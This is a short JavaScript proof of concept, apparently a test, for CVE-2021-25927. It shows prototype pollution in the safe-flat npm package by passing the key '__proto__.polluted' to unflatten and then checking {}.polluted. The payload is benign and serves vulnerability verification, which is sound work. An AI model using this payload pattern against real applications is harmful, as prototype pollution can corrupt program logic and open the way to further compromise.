// //https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25927
// test("prototype pollution in safeFlat", () => {
  var safeFlat = require("safe-flat");
  obj = {};

console.log({}.polluted);

  safeFlat.unflatten({ "__proto__.polluted": "yes" }, "."); //payload
console.log({}.polluted);
// });
